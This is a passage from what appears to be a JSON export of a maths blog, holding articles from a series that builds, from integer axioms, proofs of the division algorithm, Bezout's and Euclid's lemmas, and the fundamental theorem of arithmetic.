to which they are generated, which means we have to store all the quotients rather than working with each quotient as it is generated.\u21a9 Actually, we can set it to be anything, because it\\'s multiplied by 0: and we always get an integer solution $(x,y)$ from the two simultaneous equations, because the matrix $\\\\begin{pmatrix}8 & 3 \\\\\\\\\\\\\\\\ 29 & 11\\\\end{pmatrix}$ has an integral inverse due to its determinant!\u21a9 This is good because a computer can fill in the table at the same time as generating the quotients, so it\\'s very memory efficient.\u21a9", "id": 1725167925249904305, "dir": ["maths", "prime-factorisation"], "is_book_member": true, "name": "3-bezout-egcd"}, {"type": "article", "coming_soon": false, "mod_timestamp": 1734602400.0, "mod_date_time": "19 Dec 2024", "cr_timestamp": 1690452000.0, "cr_date_time": "27 Jul 2023", "tags": [{"name": "number-theory", "colour": "pink"}, {"name": "theorem", "colour": "green"}], "title": "The Fundamental Theorem of Arithmetic: Our Journey's End", "content": "tl;dr: A journey from the ground up in which we use axioms to build a proof that every positive integer can be uniquely prime factored. This is part 5, where we stand on what we\\'ve built from axioms so far, and finally prove the fundamental theorem of arithmetic (technically, the generalized version). In general, the level of rigor will decrease as the parts go on, so that the reader doesn\\'t get bored to death. But it should be obvious how to fill out everything with complete rigor. Here is a glossary of math symbols. Existence of a prime factorization Armed with everything we\\'ve done so far, we\\'re ready to prove that every integer greater than 1 can be uniquely written as a product of positive primes. Intitively, we want to be able to use induction: if $n$ is prime we\\'re done, and if it\\'s not then $n = ab$ with $a,b \\\\lt n$ - but by inductive hypothesis, $a$ and $b$ can both be written as a product of primes, thus $ab$ is a product of primes. We can flip this to use the well-ordering principle, because I think it\\'s nicer (and we haven\\'t actually proved that induction works). Every integer greater than 1 is a prime or a product of positive primes. Suppose not, we will show a contradiction. Then the set $\\\\{n \\\\in \\\\mathbb{N} \\\\mid n\\\\gt 1$ and $n$ is not prime or a product of positive primes$\\\\}$ is nonempty. But this set is also a subset of $\\\\mathbb{N}$, by definition. Hence by the well-ordering principle, it has a least element, say $e$. Then $e \\\\gt 1$ and $e$ is not prime of a product of positive primes. Since $e$ is not prime, there exist integers $a,b$ such that $e = ab$ and $1 \\\\lt a \\\\leq b \\\\lt n$. Now, because $e$ is minimal, $a$ and $b$ must both be positive primes or a product of positive primes (else they would be in the set). Hence we can write $a = p_1 p_2\\\\cdots p_k$ and $b = q_1 q_2\\\\cdots q_j$ where these are all positive primes. But, then $e = ab = (p_1p_2\\\\cdots p_k)(q_1q_2\\\\cdots q_j)$, thus $e$ is a product of positive primes, contradiction. Uniqueness So, we\\'ve shown that every integer greater than 1 can be factored into positive primes. But can we show that it can be factored in only one way (up to permutation) ? This is where we need to use what we\\'ve built up (i.e. Euclid\\'s Lemma). Let\\'s try using minimality again. If there\\'s an integer that has two distinct factorizations, then take the minimal example, use Euclid\\'s Lemma to cancel a common prime factor from both factorizations to obtain a smaller example, and we have a contradiction. Every integer greater than 1 can be factored into positive primes in exactly one way, up to permutations. First, note that we showed every integer greater than 1 can be factored into positive primes. Suppose there is an integer greater than 1 with two distinct factorizations. Then the set of natural numbers greater than 1 with two distinct factorizations is nonempty, so by the well-ordering principle, the set has a least element, say $e$. Write $e = p_1 p_2 \\\\cdots p_k = q_1 q_2 \\\\cdots q_j$ as two distinct factorizations of $e$ (up to permutation). Note that $k \\\\gt 1$, else $e = p_1$ and $j=1$ (since a prime cannot have two prime factors) so $e = p_1 = q_1$ and the factorizations would be the same. Similarly $j \\\\gt 1$. Then, $p_1$ divides $q_1 \\\\cdots q_j$, so by Euclid\\'s Lemma, $p_1$ divides some $q_i$ , say $q_n$. Without loss of generality (because of permutation), let $n = 1$. Since $q_1$ is prime, we have that $q_1 = p_1$. Thus, we may cancel this common prime factor from both factorizations to obtain $$p_2 \\\\cdots p_k = q_2 \\\\cdots q_j$$ which are two distinct factorizations of an integer that is strictly smaller than $e$. Also recall that $k \\\\gt 1$ and $j \\\\gt 1$, thus this new integer is bigger than 1. This contradicts the minimality of $e$, and we are done. Woop woop, we\\'ve finally proved the fundamental theorem of arithmetic! To recap, our path to the proof was: Division algorithm $\\\\implies$ Bezout\\'s lemma $\\\\implies$ Euclid\\'s lemma $\\\\implies$ FTA Do you think you can remember it all? Proof: not prime and $>1$ means there is a factorization with neither being $\\\\pm 1$.\u21a9 We could do this more rigorously, but essentially $p_1 \\\\mid q_1(q_2\\\\cdots q_j) \\\\implies p_1 \\\\mid q_1$ or $p_1 \\\\mid q_2q_3 \\\\cdots q_j$, and so on. Have a go at proving this rigorously with the well-ordering principle (with $j$ fixed) if you want.\u21a9 Why can we cancel? We need to prove the lemma that if $ac = bc$, then $a = b$ (true for all $a,b,c \\\\in \\\\mathbb{Z}, c \\\\neq 0$). But this is doable, because if $ac = bc$, then $c(a-b) = 0$, so $c=0$ or $a-b=0$, so $a=b$.\u21a9", "id": -5523666286821896395, "dir": ["maths", "prime-factorisation"], "is_book_member": true, "name": "5-fta"}, {"type": "article", "coming_soon": false, "mod_timestamp": 1734606000.0, "mod_date_time": "19 Dec 2024", "cr_timestamp": 1690300800.0, "cr_date_time": "25 Jul 2023", "tags": [{"name": "number-theory", "colour": "pink"}, {"name": "pedantic", "colour": "yellow"}], "title": "Developing the Axioms", "content": "tl;dr: A journey from the ground up in which we use axioms to build a proof that every positive integer can be uniquely prime factored. This is part 1, where we develop the basic axioms of the integers and some definitions. In general, the level of rigor will decrease as the parts go on, so that the reader doesn\\'t get bored to death. But it should be obvious how to fill out everything with complete rigor. Here is a glossary of math symbols. Axioms as Properties Over the integers, we need a set of reduced axioms from which all the known theorems can be derived using the rules of logical inference. Reduced meaning that if an axiom can be proven using other axioms, then it should not be an axiom. And philosophically, our axioms should be as simple as possible. The modern approach to axiomatic proof is for our list of axioms to be the properties that we want our system to have; but, it\\'s not clear what these fundamental properties of the integers should be. For example, it is well known that if a prime divides a product, then it divides one of the constituents (Euclid\\'s Lemma). Should this be one of our fundamental properties? It certainly feels \"obvious\", in the sense that proving it would not get you any extra points on an olympiad question. But does it follow from some other fundamental properties? How do you even define prime? In my experience, people often try to justify Euclid\\'s lemma by using prime factorization. The problem with this is that it feels backwards - the fact that every integer can be uniquely prime factorized is an extremely powerful result (hence the name fundamental theorem of arithmetic (FTA)), and so using it feels like overkill and may even be circular reasoning. We could have FTA as an axiom. But if we can prove it from simpler axioms, then why bother? How deep do we go? At some point, we need to stop our search for rigor - otherwise we will get too far out of the math world and into philosophy. For example, what does it mean for two things to be equal? And so, we will assume some basic notions: Equality is reflexive ($a=a$), symmetric ($a=b$ means $b=a$) and transitive (if $a=b$ and $b=c$ then $a=c$) If $a=b$ then we may substitute $a$ for $b$ and vice versa, in any expression containing them Properties of logic and basic set theory Order of operations Basic properties We are working with the integers (whole numbers, $\\\\mathbb{Z}$) and naturals (positive whole numbers, $\\\\mathbb{N}$), under two basic operations: addition and multiplication ($+, \\\\cdot$). More technically, it is an underlying assumption that $\\\\mathbb{Z}$ is closed under two well-defined binary operations $+, \\\\cdot$, i.e. that adding or multiplying two integers always gives an integer. (This is not the case for division!) Let\\'s add the first items to our \"inventory\" of fundamental properties. Commutativity: the order of multiplication and addition does not matter. In symbols: $$\\\\forall a,b \\\\in \\\\mathbb{Z}, \\\\; a \\\\cdot b = b \\\\cdot a, \\\\; a+b=b+a$$ Associativity: in repeated addition or multiplication, the brackets do not matter. In symbols: $$\\\\forall a,b,c \\\\in \\\\mathbb{Z}, \\\\; (a \\\\cdot b) \\\\cdot c = a \\\\cdot (b \\\\cdot c),$$ $$(a+b)+c = a+(b+c)$$ Distributivity: multiplication is distributive over addition. In symbols: $$\\\\forall a,b,c \\\\in \\\\mathbb{Z}, \\\\; a\\\\cdot(b+c) = a\\\\cdot b + a \\\\cdot c$$ I hope you agree that these properties seem pretty fundamental. Let\\'s add some more: Additive Identity: there exists an integer we call $0$, which when added to any integer, does nothing: $$\\\\exists \\\\, 0 \\\\in \\\\mathbb{Z} \\\\; s.t. \\\\; \\\\forall a \\\\in \\\\mathbb{Z}, a+0=a$$ Additive Inverse: for every integer $a$, there is another integer that when added to $a$, gives 0. $$\\\\forall a \\\\in \\\\mathbb{Z}, \\\\exists \\\\, a\\' \\\\in \\\\mathbb{Z} \\\\; s.t.\\\\; a + a\\' = 0$$ Multiplicative Identity: there exists an integer we call $1$, which when multiplying by any integer, does nothing: $$\\\\exists \\\\, 1 \\\\in \\\\mathbb{Z} \\\\; s.t. \\\\; \\\\forall a \\\\in \\\\mathbb{Z}, a\\\\cdot 1=a$$ Note that we don\\'t have multiplicative inverses, because then we would have to include reciprocals of integers. Furthermore, we can use the commutative property to extend some of the above axioms: Distributivity: As well as $a \\\\cdot (b+c) = a\\\\cdot b + a \\\\cdot c$, we also have $(b+c)\\\\cdot a = b \\\\cdot a + c \\\\cdot a $ Additive identity: $a+0 = 0+a = 0$ instead of just $a+0=a$ Additive inverse: $a+a\\'=a\\'+a=0$ instead of just $a+a\\'=0$ Multiplicative identity: $a\\\\cdot 1 = 1 \\\\cdot a = a$ instead of just $a \\\\cdot 1 = a$ If we don\\'t do this then whenever we cite these axioms, we would have to remember the way round we wrote it, which is utter hell. Uniqueness We haven\\'t explicitly stated that 0 (the additive identity), 1 (the multiplicative identity) and additive inverses are unique. Again, this feels intuitive - if a+b = a, then b=0, right? And -1 is the additive inverse of 1, right? Maybe we should add uniqueness as an axiom. Actually, we can prove it from what we already have. I encourage you to try and do so. $0$ is unique, i.e. the only additive identity of $\\\\mathbb{Z}$. Suppose that $0$ and $0\\'$ are two additive identities of $\\\\mathbb{Z}$. We will show that $0\\' = 0$. Note that $0 + 0\\' = 0$, by +ive id. But also $0 + 0\\' = 0\\'$, by +ive id. Thus $0 = 0 + 0\\' = 0\\'$, so $0 = 0\\'$, as required. The proof for the uniqueness of $1$ is completely analogous, so it is left to the reader. Additive inverses are unique. Let $a$ be an arbitrary integer. Let $b,c$ be two additive inverses of a. We will show that $b = c$. Consider $(b+a)+c$. One one hand: $(b+a)+c = 0+c$ by +ive inv. $= c$ by +ive id. On the other hand: $(b+a)+c = b+(a+c)$ by assoc. $ = b+0$ by +ive inv. $= b$ by +ive id. Thus, $b = (b+a)+c = c$, so $b=c$, as required. Now we can introduce negative signs as the way to refer an integer\\'s unique additive inverse: for each integer $n$, we denote its unique additive inverse as $-n$. Then, we can define $a-b$ to be shorthand for $a+(-b)$, which is a nice way to avoid having to define subtraction as another operation. Ordering of Z What we have so far is good, but we need more. For example we haven\\'t axiomatized the naturals yet, and what about proof techniques? Z is ordered: There exists a non-empty subset $\\\\mathbb{N}$ of $\\\\mathbb{Z}$ that is closed under $+,\\\\cdot$ and satisfies Trichotomy: for all $a \\\\in \\\\mathbb{Z}$, exactly one of $a \\\\in \\\\mathbb{N}, a=0, -a \\\\in \\\\mathbb{N}$ is true. Well-ordering principle: Every non-empty subset of the integers has a least element, defined as an element $e$ of the subset such that for all elements $x$ of the subset, $e\\\\leq x$. The importance of the well-ordering principle cannot be understated, because it will let us finish off proofs by assuming minimality and showing a contradiction (i.e. infinite descent). Definitions Let\\'s make a list of things we\\'ll probably need to explicitly define if we want to have hope of proving FTA: divisibility and primality inequalities, notion of positive/negative common divisors, gcd and lcm (greatest common divisor, lowest common multiple) So, let\\'s try to define these rigorously. Let $a,b,c,p \\\\in \\\\mathbb{Z}$. $a \\\\mid b$ (\"a divides b\", \"b is divisible by a\") if and only if (\"iff\") $\\\\exists k \\\\in \\\\mathbb{Z} \\\\; s.t. \\\\; b = a \\\\cdot k$. Then $a$ is a \"factor\" or \"divisor\" of $b$ and $b$ is a \"multiple\" of $a$. $a-b$ is shorthand for $a + -b$. $a \\\\gt b$ iff $a-b \\\\in \\\\mathbb{N}$. $a \\\\lt b$ iff $b \\\\gt a$. $a \\\\geq b$ iff $a \\\\gt b$ or $a=b$. $a \\\\leq b$ iff $b \\\\geq a$. $a \\\\gt b \\\\gt c$ iff $a \\\\gt b$ and $b \\\\gt c$; in this case $b$ is \"strictly between\" $a$ and $c$. Vice versa for $a \\\\lt b \\\\lt c$. $a$ is positive iff $a \\\\gt 0$, and \"negative\" iff $a \\\\lt 0$. $p$ is prime iff for all ways of writing $p = u \\\\cdot v$ with $u,v \\\\in \\\\mathbb{Z}$, exactly one of $u,v$ is 1 or -1. $a$ is a gcd of $b,c$ if for all common divisors $a\\'$ of $b,c$, $a \\\\geq a\\'$. $a$ is a lcm of $b,c$ if for all common multiples $a\\'$ of $b,c$, $a \\\\leq a\\'$ Note: in the definition of prime, mathematicians like to define another thing called a unit, which is a factor of 1; in the case of the integers, the only factors of 1 are 1 and -1 (why?). Also, for the sake of brevity, we will skip the proofs that gcds and lcms exist and are unique, and that all common divisors divide the greatest common divisor (left as an exercise). Thus we can refer to the unique gcd of $a,b$ as $gcd(a,b)$ or $(a,b)$, and the unique lcm of $a,b$ as $lcm(a,b)$ or $[a,b]$. Structuring logic, building lemmas So, what\\'s the point of all these axioms and definitions? It means we can start to inch towards our goal by building lemmas. For example: $\\\\forall a \\\\in \\\\mathbb{Z}, \\\\; 0 \\\\cdot a = a \\\\cdot 0 = 0$. Let $a$ be an arbitrary integer. $0 \\\\cdot a = (0 + 0) \\\\cdot a$ by +ive id. $ = 0 \\\\cdot a + 0 \\\\cdot a$ by dist. Thus, $(0 \\\\cdot a) + -(0 \\\\cdot a) = (0 \\\\cdot a + 0 \\\\cdot a) + -(0 \\\\cdot a)$ The left hand side equals $0$, by +ive inv. The right hand side is: $(0 \\\\cdot a + 0 \\\\cdot a) + -(0 \\\\cdot a)$ $= 0 \\\\cdot a + (0 \\\\cdot a + -(0 \\\\cdot a))$ by assoc. $= 0 \\\\cdot a + 0$ by +ive inv. $= 0 \\\\cdot a$ by +ive id. Therefore, equating the RHS and LHS, we obtain $0 = 0\\\\cdot a$. Thus by comm., $0 \\\\cdot a = a \\\\cdot 0 = 0$, as required. Wow, that seemed tedious! But the point is, even though the fact that 0 times anything is 0 seems fundamental, we don\\'t actually need it as an axiom, because we can prove it from the axioms we already have. I will give one more lemma with full proof, so that you get the idea (referring to axioms at each step, etc). Then, I\\'ll give the list of lemmas that can be built up, and the main ideas for how to prove them, but not the complete proofs. In $Z$, if $d \\\\mid a, d\\\\mid b$ then $d \\\\mid (a \\\\cdot r+b \\\\cdot s)$ for any $r,s \\\\in \\\\mathbb{Z}$ Suppose $d \\\\mid a, d \\\\mid b$. Let $r,s \\\\in \\\\mathbb{Z}$, we will show that $d \\\\mid (a\\\\cdot r+b\\\\cdot s)$. $d \\\\mid a \\\\implies a = d \\\\cdot k$ for some $k \\\\in \\\\mathbb{Z}$ And, $d \\\\mid b \\\\implies b = d \\\\cdot j$ for some $j \\\\in \\\\mathbb{Z}$ Thus, $a\\\\cdot r + b \\\\cdot s = (d \\\\cdot k) \\\\cdot r + (d \\\\cdot j) \\\\cdot s$ $ = d \\\\cdot (k \\\\cdot r) + (d \\\\cdot j) \\\\cdot s$ by assoc. $ = d \\\\cdot (k \\\\cdot r) + d \\\\cdot (j \\\\cdot s)$ by assoc. $ = d \\\\cdot (k \\\\cdot r + j \\\\cdot s)$ by dist. But $k\\\\cdot r + j \\\\cdot s$ is an integer because of closure, thus $\\\\exists \\\\, x \\\\in \\\\mathbb{Z} \\\\;s.t.\\\\; (a\\\\cdot r + b \\\\cdot s) = d \\\\cdot x$, namely $x = k\\\\cdot r + j\\\\cdot s$. Thus by defn. of \"divides\", $d \\\\mid (a \\\\cdot r + b \\\\cdot s)$, as required. Lemma List Now for the list of lemmas that can be built up. To prevent circular reasoning, if lemma A is used to prove lemma B, then A will have a lower lemma number than B. Feel free to fill out the details of each proof (it\\'s a good exercise!). $\\\\forall a \\\\in \\\\mathbb{Z}, -(-a) = a$ Follows from $a + (-a) = 0$ and uniqueness of +ive inv. $\\\\forall a,b,c \\\\in \\\\mathbb{Z}, a=b \\\\iff a+c=b+c$ Forward direction is immediate, backwards direction follows from adding $-c$ to both sides. $-0 = 0$ Consider $0 + -0$; it equals both $-0$ and $0$. If $d \\\\mid a, d \\\\mid b$ then $d \\\\mid (a\\\\cdot r+b \\\\cdot s)$ See above. $0 \\\\cdot a = a \\\\cdot 0 = 0$ See above. $a\\\\gt b,b \\\\gt c \\\\implies a \\\\gt c$ If $a \\\\gt b,b \\\\gt c$ then $a-b$ and $b-c$ are naturals by defn. of \"$\\\\gt$\". Thus $(a-b)+(b-c)$ is natural by closure, which simplifies and implies the result. $-a = (-1)\\\\cdot a$ By Lemma 2, $0 = 0\\\\cdot a$, which equals $(1+(-1))\\\\cdot a = a + (-1)\\\\cdot a$. So $0 = (-1)\\\\cdot a + a$. Add $-a$ to both sides for the result. $a \\\\gt 0 \\\\iff a \\\\in \\\\mathbb{N}$ If $a\\\\gt 0$ then $a-0 \\\\in \\\\mathbb{N}$ by defn of \"$\\\\gt$\". But $a-0 = a+(-0) = a+0 = a$, using Lemma 3 and +ive id. $1 \\\\in \\\\mathbb{N}$ Use Trichotomy and eliminate the other two cases by contradiction. If $1=0$, then since $\\\\mathbb{N}$ is nonempty, pick a natural $x$, then we have $x = 1\\\\cdot x = 0 \\\\cdot x = 0$ (by *ive id. and Lemma 5) So $0$ is natural, which contradicts Trichotomy. If $-1$ is natural, then so is $(-1)\\\\cdot(-1)$ by closure, but $(-1)\\\\cdot (-1) = -(-1) = 1$ by Lemma 7 and Lemma 1. So -1 and 1 are both natural, contradicting Trichotomy. $-(a-b) = b-a$ Use Lemma 7 and Lemma 1: $-(a-b) \\\\\\\\\\\\\\\\= (-1) \\\\cdot (a-b) \\\\\\\\\\\\\\\\= (-1) \\\\cdot a + (-1) \\\\cdot (-b) \\\\\\\\\\\\\\\\= -a + -(-b) \\\\\\\\\\\\\\\\= -a + b \\\\\\\\\\\\\\\\= b-a$ $a\\\\gt b \\\\implies a+c\\\\gt b+c$ Follows from Lemma 7, and that $a-b = (a+c)-(b+c)$. $\\\\forall a,b \\\\in \\\\mathbb{N}, c \\\\in \\\\mathbb{Z}$, if $a=b\\\\cdot c$ then $c \\\\in \\\\mathbb{N}$ Use Trichotomy. If $c=0$, then $a=0$ by Lemma 2, so $0$ is natural, contradicting Trichotomy. If $-c \\\\in \\\\mathbb{N}$ then after applying Lemma 7 (and basic axioms) we get that $-a \\\\in \\\\mathbb{N}$, contradicting Trichotomy. $a\\\\lt b$ and $c \\\\lt 0 \\\\implies a\\\\cdot c \\\\lt b \\\\cdot c$ If $a\\\\lt b$ then $b-a \\\\in \\\\mathbb{N}$ and so by Lemma 8 and closure, $(b-a)\\\\cdot c \\\\in \\\\mathbb{N}$. This can be rearranged to $b\\\\cdot c - (a \\\\cdot c)$, implying the result. There are no integers strictly between $0$ and $1$. Suppose there is an integer $a$ between $0$ and $1$. By Lemma 8, $a \\\\in \\\\mathbb{N}$, and so by the well-ordering principle, let $e$ be the smallest such integer. More precisely, we are considering the set $\\\\{n \\\\in \\\\mathbb{N} \\\\mid n \\\\lt 1\\\\}$. Now, $e \\\\cdot e \\\\lt 1 \\\\cdot e$ (Lemma 13) and so $e \\\\cdot e$ is a smaller element of the set, contradiction. Exactly one of $a\\\\lt b, a=b, a\\\\gt b$ is true. Trichotomy on $a-b$. Exactly one of $a\\\\geq b, a\\\\lt b$ is true. Follows from Lemma 15. $\\\\forall a \\\\in \\\\mathbb{Z},\\\\; a \\\\in \\\\mathbb{N} \\\\iff a \\\\geq 1$ Forward direction: suppose $a \\\\in \\\\mathbb{N}$ is true and $a \\\\geq 1$ is false, we will show a contradiction. By Lemma 16, we have $a\\\\lt 1$. But also $a\\\\gt 0$ by Lemma 8 so a is an integer strictly between $0$ and $1$, contradicting Lemma 14. Backward direction: suppose $a \\\\geq 1$, then $a\\\\gt 1$ or $a=1$. If $a=1$ then Lemma 9 finishes. If $a \\\\gt 1$ then since $1 \\\\in \\\\mathbb{N}$ (Lemma 9), we have $1\\\\gt 0$ (Lemma 8), so $a \\\\gt 1, 1 \\\\gt 0$, so $a\\\\gt 0$ (Lemma 3), then Lemma 8 to finish. $a \\\\geq b \\\\iff a \\\\gt b-1$ Forward direction: First case: if $a\\\\gt b$ then $a-b \\\\in \\\\mathbb{N}$, thus so is $(a-b)+1$ by Lemma 9 and Closure. This can be rewritten as $a-(b-1)$, which implies the result by defn. of \"$\\\\gt$\". Second case: if $a=b$, then by Lemma 9, $0+1 \\\\in \\\\mathbb{N}$, which equals $b-(b-1)$, and so $b\\\\gt b-1$. Substitue for the result. Backward direction: suppose $a\\\\gt b-1$. Then $a-(b-1) \\\\in \\\\mathbb{N}$, which can be rearranged to $1-(b-a)$, so $b-a\\\\lt 1$. We must have $a \\\\geq b$, because if not, then by Lemma 16 $a\\\\lt b$ so $0 \\\\lt b-a$ (Lemma 8) so $b-a$ is an integer strictly between $0$ and $1$, contradicting Lemma 14. $\\\\forall m,n \\\\in \\\\mathbb{N}, m \\\\mid n \\\\implies m \\\\leq n$ Write $n = m \\\\cdot k$. Note that $k \\\\geq 1$; else we would have $k \\\\lt 1$ (Lemma 16) and so $k \\\\in \\\\mathbb{N}$ with $k \\\\lt 1$ (Lemma 12), so $0\\\\lt k \\\\lt 1$ (Lemma 8) contradicting Lemma 14. Thus $k=1$ or $1\\\\lt k$ and we can multiply both sides of the inequality by $m$ (Lemma 13) to deduce the result. $\\\\forall n,x \\\\in \\\\mathbb{N}$, if $n = x \\\\cdot n$ then $x = 1$ First note that we can\\'t appeal to uniqueness of the multiplicative inverse, because $n$ is fixed. So suppose $x \\\\neq 1$, we\\'ll show a contradiction. $x \\\\in \\\\mathbb{N} \\\\implies x \\\\gt 1$ (Lemma 17 and defn. of \"$\\\\geq$\") $\\\\implies 1 \\\\cdot n \\\\lt x \\\\cdot n$ (defn. of \"$\\\\lt$\" and Lemma 13) $\\\\implies n \\\\lt n$ So $n -n \\\\in \\\\mathbb{N}$, so $0 \\\\in \\\\mathbb{N}$, contradicting Trichotomy. Phew, that was a lot of lemmas! But I hope you agree they\\'re all very fundamental. In the next part, we\\'ll look at proving our first important theorem - the division algorithm. These six properties come from the fact that $\\\\mathbb{Z}$ is a ring (mathematical structure).\u21a9 I\\'m gonna skip over the whole \"is 0 a natural number\" thing.\u21a9 The well-ordering principle is actually equivalent to induction!\u21a9", "id": 3940439037919895096, "dir": ["maths", "prime-factorisation"], "is_book_member": true, "name": "1-integer-axioms"}, {"type": "article", "coming_soon": false, "mod_timestamp": 1690300800.0, "mod_date_time": "25 Jul 2023", "cr_timestamp": 1690300800.0, "cr_date_time": "25 Jul 2023", "tags": [{"name": "number-theory", "colour": "pink"}, {"name": "pedantic", "colour": "yellow"}], "title": "Discovering Division", "content": "tl;dr: A journey from the ground up in which we use axioms to build a proof that every positive integer can be uniquely prime factored. This is part 2, where we use the rigorous foundation we developed in part 1 to establish the division algorithm. In general, the level of rigor will decrease as the parts go on, so that the reader doesn\\'t get bored to death. But it should be obvious how to fill out everything with complete rigor. Here is a glossary of math symbols. Back to School Children tend to get taught division as repeated subtraction - for example, 14 divided by 3 is 4 remainder 2, because: $14 - 3 = 11$ $11 - 3 = 8$ $8 - 3 = 5$ $5 - 3 = 2$ And we stop because if we subtract again, the remainder becomes negative. In particular, 2<3, and in general the remainder is always less than the divisor, because if it was at least as big then we could always subtract off another copy. That would definitely be enough justification to any high schooler as to why the division algorithm works. But, how do we prove it from our axioms and lemmas that we\\'ve developed so far? How do we make infinite descent rigorous? Let\\'s first formalize the statement we want to prove: For any $a \\\\in \\\\mathbb{Z}, b \\\\in \\\\mathbb{N}$, there exist integers $q,r$ such that $a = bq + r$, and $0 \\\\leq r \\\\lt b$. Now... how do we attempt a proof? The key is the well-ordering principle that we introduced, stating that every non-empty subset of the naturals has a least element. To use this, we can consider the set of all possible remainders, i.e. all the possible numbers we can obtain by starting with $a$ and adding or subtracting $b$. Then we can consider those remainders that are natural, and take the smallest element. If it\\'s at least $b$, then we can subtract $b$ again to get a smaller element of the set, contradiction. In other words, \"choose the smallest possible remainder, if it\\'s at least $b$ then subtract $b$\". Do you see how this is equivalent to the infinite descent argument? Let $a$ be a fixed integer and $b$ be a fixed natural. Consider the set: $$S = \\\\{n \\\\in \\\\mathbb{N} \\\\mid n = a - bq + 1, q \\\\in \\\\mathbb{Z}\\\\}$$ Then S is a subset of the naturals. Furthermore, it is nonempty, because: if $a \\\\in \\\\mathbb{N}$ or $a=0$, then when $q=0$, $n = a - b \\\\cdot 0 + 1 = a+1$ which is natural and so it is an element of S. if $-a \\\\in \\\\mathbb{N}$, then when $q = -a$, $n = a-b(-a) + 1$ $ = (-a)(b-1) + 1$ which is natural since $(-a), (b-1)$ are nonnegative, and so it is an element of S. By Trichotomy, we considered all cases, thus S is always non-empty. Hence by the well-ordering principle, S has a least element (say $e$), occuring when $q = q_0$, so that $e = a - bq_0+1$. $e \\\\leq b$ Suppose not, we will show a contradiction. Then $e\\\\gt b$, so $e-b \\\\in \\\\mathbb{N}$ (defn. \"$\\\\gt$\"). But $e-b = (a-bq_0+1)-b$ $ = a-b(q_0+1)+1$, and so $e-b \\\\in S$. But $e-b \\\\lt e$, contradicting the minimality of $e$. Now at last, letting $r = e-1$, we have $a = bq_0 + r$ (since $e = a-bq_0+1$). Since $0 \\\\lt e \\\\leq b$, we have $0 \\\\leq r \\\\lt b$, which is what we wanted, and we are done. Note that I stopped writing the multiply symbol in between two letters, as per normal convention. Also, I stopped being as rigorous as in part 1 (for example writing \"$a-bq+1$\" instead of \"$(a-bq)+1$\" due to associativity), because I don\\'t think anyone would want to read such a long tedious proof. BUT, it should be clear (if not monotonous) how to fill out this proof into one as rigorous as in part 1. And that\\'s it! We\\'ve now proved the division algorithm. High schoolers would be very impressed (not). Can you come up with an analogous division algorithm for the complex numbers? Can you prove that it works?\u21a9", "id": -2300714878297196083, "dir": ["maths", "prime-factorisation"], "is_book_member": true, "name": "2-division-algo"}, {"type": "article", "coming_soon": false, "mod_timestamp": 1690452000.0, "mod_date_time": "27 Jul 2023", "cr_timestamp": 1690452000.0, "cr_date_time": "27 Jul 2023", "tags": [{"name": "number-theory", "colour": "pink"}], "title": "Proving Euclid's Lemma", "content": "tl;dr: A journey from the ground up in which we use axioms to build a proof that every positive integer can be uniquely prime factored. This is part 4, where we use what we have so far to finally prove Euclid\\'s Lemma (technically, the generalized version). In general, the level of rigor will decrease as the parts go on, so that the reader doesn\\'t get bored to death. But it should be obvious how to fill out everything with complete rigor. Here is a glossary of math symbols. What? It\\'s... argh! Ask anyone to prove this: If $2x$ is divisible by $3$, then so is $x$. I bet that almost everyone would attempt to use prime factorization: \"in the prime factorization of $2x$, there must be a 3. But 2 is a prime, thus the 3 must occur in the prime factorization of $x$.\" Ok... but we\\'re trying to prove prime factorization, so we can\\'t use it! Actually, we can do something smart in this case: if $3 \\\\mid 2x$, then $3 \\\\mid (3x - x)$. But $3 \\\\mid 3x$, therefore $3 \\\\mid x$, by Lemma 4 in part 1 (i.e. that if $a \\\\mid b, a \\\\mid c$ then $a$ divides any linear combination of $b$ and $c$). In other words, if $2x$ is divisible by 3 then so is $-2x$, therefore so is $-2x + 3x$. Now ask them to prove the generalized version: If $a \\\\mid bc$ and $gcd(a,b) = 1$, then $a \\\\mid c$. Here\\'s where most people would really like to appeal to prime factorization: \"the set of prime factors of b must be completely different to the set of prime factors of a, else they would share a common factor. So in the prime factorization of bc, removing the factorization of b will not affect any primes that divide a. So a divides c.\" So, how do we prove this using only the things we\\'ve built out of axioms? We can actually generalize the trick from before! In the \"if $3 \\\\mid 2x$ then $3 \\\\mid x$\" case, the trick was to write 1 (the desired coefficient of $x$) as a linear combination of 2 and 3: $$x = (3-2)x = 3x-2x$$ And this let us deduce that if $3 \\\\mid 2x$, then $3 \\\\mid 3x - 2x$ because both $3x$ and $2x$ are divisible by 3. Let\\'s try with a different pair of numbers. If $51 \\\\mid 28x$, does $51 \\\\mid x$ ? TRICK: Try to write 1 as a linear combination of 51 and 28. But we know we can do this, by Bezout\\'s Lemma, which we proved in the previous article! To find a concrete solution, use the magic box (see the previous article if you are unfamiliar): 1 1 4 1 1 2 0 1 1 2 9 11 20 51 1 0 1 1 5 6 11 28 So, $11 \\\\cdot 51 - 20 \\\\cdot 28 = 1$. Now to use the trick: $$x = (11 \\\\cdot 51 - 20 \\\\cdot 28)x$$ $$ = 51 \\\\cdot (11x) + 28x \\\\cdot (-20)$$ Hence, if $51 \\\\mid 28x$, then $51 \\\\mid x$, because we wrote $x$ as a linear combination of things that were divisible by 51. I think we\\'re ready to generalize now. If $a \\\\mid bc$ and $gcd(a,b)=1$, then $a \\\\mid c$. True in $\\\\mathbb{Z}$. Suppose $a \\\\mid bc$ and $gcd(a,b) = 1$. Then by Bezout\\'s Lemma, there exist integers $x,y$ such that $ax + by = 1$. Hence, $c = (ax+by)c = a(cx) + y(bc)$. Since $a \\\\mid bc$ and $a \\\\mid a(cx)$, we have that $a \\\\mid a(cx) + y(bc)$, so $a \\\\mid c$, as required. Nice - surprisingly simple proof, right? Actually, Euclid\\'s Lemma states that if $p$ is a prime and $p \\\\mid ab$ (where $a,b$ are two integers), then $p \\\\mid a$ or $p \\\\mid b$. But what we\\'ve already proved is pretty much a generalized version of this.", "id": -112454765447807896, "dir": ["maths", "prime-factorisation"], "is_book_member": true, "name": "4-euclid"}, {"type": "book", "coming_soon": false, "mod_timestamp": 1734606000.0, "mod_date_time": "19 Dec 2024", "cr_timestamp": 1690300800.0, "cr_date_time": "25 Jul 2023", "tags": [{"name": "number-theory", "colour": "pink"}], "title": "Prime Factorisation & the Fundamental Theorem of Arithmetic", "content": "A rigorous journey from the ground up in which we use axioms to build a proof that every positive integer can be uniquely prime factored. In general, the level of rigor will decrease as the parts go on, so that the reader doesn\\'t get bored to death. But it should be obvious how to fill out everything with complete rigor.", "id": 8415495561603050839, "dir": ["maths"], "is_book_member": true, "name": 